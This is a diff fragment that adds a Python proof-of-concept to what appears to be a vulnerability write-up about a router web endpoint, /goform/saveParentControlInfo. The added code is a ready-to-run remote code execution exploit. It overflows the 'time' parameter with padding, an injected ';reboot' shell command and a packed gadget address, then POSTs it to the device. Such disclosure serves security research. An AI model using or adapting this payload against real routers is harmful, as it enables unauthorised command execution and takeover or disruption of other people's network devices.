@@ -26,3 +26,23 @@ So by POSTing the page `/goform/saveParentControlInfo` with proper `time`, the a
 
 The exploit of **Remote Code Execution**:
 
+```python
+from pwn import*
+import requests
+
+url = "https://192.168.2.1/goform/saveParentControlInfo"
+
+gadget = 0x37208
+
+time =  b"a" * 0x58
+time += b";reboot"
+time += b"-"
+time += b"b" * 0x34
+time += p32(gadget)
+
+r = requests.post(url, data = {"time":time},verify=False )
+
+
+print(r.content)
+
+```
